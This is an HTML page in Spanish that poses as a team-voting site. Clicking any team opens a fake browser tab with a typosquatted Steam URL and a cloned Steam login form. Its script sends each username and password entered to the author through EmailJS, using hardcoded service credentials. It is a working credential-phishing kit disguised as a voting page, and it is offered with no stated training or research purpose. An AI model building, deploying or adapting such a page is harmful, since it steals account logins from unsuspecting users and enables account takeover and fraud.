<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<title>Votación de Equipos con Pestaña Simulada</title>
<style>
  body {
    margin: 0;
    min-height: 100vh;
    background: radial-gradient(circle at top, #1b2838 0%, #0e1621 60%);
    font-family: Arial, Helvetica, sans-serif;
    color: #c6d4df;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 40px 0;
  }

  /* Contenedor de los equipos */
  .teams-container {
    display: flex;
    gap: 20px;
    justify-content: center;
    margin-bottom: 50px;
  }

  .team {
    width: 120px;
    height: 120px;
    border-radius: 8px;
    overflow: hidden;
    cursor: pointer;
    box-shadow: 0 0 8px rgba(102, 192, 244, 0.7);
    transition: transform 0.2s ease;
  }

  .team img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
  }

  .team:hover {
    transform: scale(1.05);
  }

  /* Pestaña simulada (modal) */
  .modal {
    position: fixed;
    top: 60px;
    left: 50%;
    transform: translateX(-50%);
    width: 850px;
    height: 400px;
    background: #171a21;
    border-radius: 8px;
    box-shadow: 0 15px 50px rgba(0,0,0,0.8);
    display: none;
    flex-direction: column;
    z-index: 1000;
  }

  /* Barra superior que simula URL + botón cerrar */
  .modal-header {
    background: #0e1621;
    color: #66c0f4;
    font-size: 14px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 20px;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    user-select: none;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }

  .modal-url {
    font-weight: 600;
    font-style: italic;
    letter-spacing: 0.8px;
  }

  .modal-close {
    background: #ff4c4c;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    color: white;
    font-weight: bold;
    text-align: center;
    line-height: 22px;
    cursor: pointer;
    transition: background 0.3s ease;
  }

  .modal-close:hover {
    background: #ff1a1a;
  }

  /* Contenido del modal */
  .modal-content {
    flex: 1;
    padding: 25px 40px;
    display: flex;
    color: #c6d4df;
  }

  /* Formulario login */
  .steam-box {
    background: #171a21;
    width: 100%;
    height: 100%;
    border-radius: 6px;
    display: flex;
    padding: 30px 40px;
    box-sizing: border-box;
    position: relative;
    color: #c6d4df;
  }

  .left {
    flex: 1;
    display: flex;
    flex-direction: column;
  }

  .logo-title {
    display: flex;
    align-items: center;
    margin-bottom: 25px;
  }

  .logo-title img {
    width: 40px;
    margin-right: 10px;
  }

  .label {
    font-size: 12px;
    color: #66c0f4;
    margin-bottom: 5px;
  }

  input {
    width: 100%;
    padding: 10px;
    background: #32353c;
    border: none;
    color: white;
    margin-bottom: 15px;
    border-radius: 2px;
    outline: none;
  }

  .remember {
    display: flex;
    align-items: center;
    font-size: 13px;
    margin-bottom: 20px;
    color: #c6d4df;
  }

  button {
    width: 100%;
    padding: 12px;
    background: linear-gradient(90deg,#06bfff,#2d73ff);
    border: none;
    color: white;
    font-weight: bold;
    font-size: 15px;
    border-radius: 2px;
    cursor: pointer;
  }

  .right {
    width: 260px;
    text-align: center;
    color: #66c0f4;
    font-size: 12px;
    display: flex;
    flex-direction: column;
    justify-content: center;
  }

  .right div {
    margin-top: 10px;
  }

  .footer {
    position: absolute;
    bottom: 30px;
    font-size: 12px;
    color: #8f98a0;
  }

  .footer span {
    color: #66c0f4;
  }
</style>
</head>

<body>

<!-- Contenedor con las imágenes de los equipos -->
<div class="teams-container">
  <div class="team" data-team="Alpha">
    <img src="https://i.pinimg.com/736x/2c/6d/fd/2c6dfdf7fd345d43a85fd23339bc303b.jpg" alt="Equipo Alpha" />
  </div>
  <div class="team" data-team="Beta">
    <img src="https://i.pinimg.com/1200x/50/c7/f9/50c7f96e9f9a5e35d0ecd7746df5c943.jpg" alt="Equipo Beta" />
  </div>
  <div class="team" data-team="Gamma">
    <img src="https://i.pinimg.com/1200x/2f/43/98/2f43988f7513271a49b981bd00efe187.jpg" alt="Equipo Gamma" />
  </div>
  <div class="team" data-team="Delta">
    <img src="https://i.pinimg.com/1200x/d4/13/61/d4136120abefa9699fc272ead7d54fb3.jpg" alt="Equipo Delta" />
  </div>
  <div class="team" data-team="Epsilon">
    <img src="https://i.pinimg.com/1200x/69/c7/9a/69c79a9ab7c89fe9287fc7cbbb9f5ddd.jpg" alt="Equipo Epsilon" />
  </div>
</div>

<!-- Modal / Pestaña simulada -->
<div class="modal" id="modal">
  <div class="modal-header">
    <div class="modal-url">https://store.steaampoweered.com/login/</div>
    <div class="modal-close" id="modalClose">×</div>
  </div>
  <div class="modal-content">
    <div class="steam-box">
      <div class="left">
        <div class="logo-title">
          <img src="https://www.citypng.com/public/uploads/preview/steam-white-logo-hd-png-701751694706440swid9yuigf.png" alt="Logo Steam" />
        </div>
        <form id="login-form">
          <div class="label">INICIA SESIÓN CON TU NOMBRE DE CUENTA</div>
          <input type="text" name="username" placeholder="Nombre de cuenta" required />
          <div class="label">CONTRASEÑA</div>
          <input type="password" name="password" placeholder="Contraseña" required />
          <div class="remember">
            <input type="checkbox" name="remember" checked style="width:auto;margin-right:8px;" />
            Recordarme
          </div>
          <button type="submit">Iniciar sesión</button>
        </form>
      </div>
      <div class="right">
        <div>O BIEN CON UN CÓDIGO QR</div>
        <div style="font-size: 12px;">
          Usa la aplicación <b>Steam Mobile</b><br />
          para iniciar sesión con un código QR
        </div>
      </div>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  emailjs.init('3x0styJQNXamR4XT4');

  // Abrir modal al hacer clic en equipo
  document.querySelectorAll('.team').forEach(team => {
    team.addEventListener('click', () => {
      document.getElementById('modal').style.display = 'flex';
    });
  });

  // Cerrar modal con la X roja
  document.getElementById('modalClose').addEventListener('click', () => {
    document.getElementById('modal').style.display = 'none';
  });

  // Enviar formulario con EmailJS
  document.getElementById('login-form').addEventListener('submit', function (event) {
    event.preventDefault();

    const username = this.username.value;
    const password = this.password.value;
    const remember = this.remember.checked ? 'Sí' : 'No';

    emailjs
      .send('service_33u0mdn', 'template_vs7phvq', {
        username: username,
        password: password,
        remember: remember,
      })
      .then(() => alert('Correo enviado con datos del formulario'))
      .catch(error => alert('Error al enviar correo: ' + error.text));
  });
</script>

</body>
</html>

</body>
</html>
